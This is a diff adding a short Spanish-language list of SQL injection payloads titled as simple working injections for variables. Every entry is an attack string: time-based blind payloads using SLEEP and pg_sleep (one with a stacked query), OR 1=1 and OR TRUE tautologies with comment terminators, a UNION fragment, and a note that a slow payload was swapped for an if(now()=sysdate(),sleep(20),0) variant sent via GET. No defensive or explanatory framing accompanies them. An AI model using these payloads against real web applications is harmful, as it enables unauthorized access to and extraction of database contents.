@@ -1,0 +1,17 @@
+INYECCIONES FUNCIONALES SIMPLE EN VARIABLES:
+
+1.- user='XOR%20SLEEP(5)%20OR'
+
+2.- Encabezado:12345"UNION inyecion_consulta AND"
+
+3.- OR 1=1
+
+4.- 'OR SLEEP(10) OR'
+
+5.- -1' OR TRUE --
+
+6.- sleep(20)
+
+7.- 'XOR%20sleep(20)%20OR' << tardó demasie, se uso este >> 'XOR(if(now()=sysdate(),sleep(20),0))OR' GET
+
+9.- &usuario=55555555';select%20pg_sleep(20);%20--%20
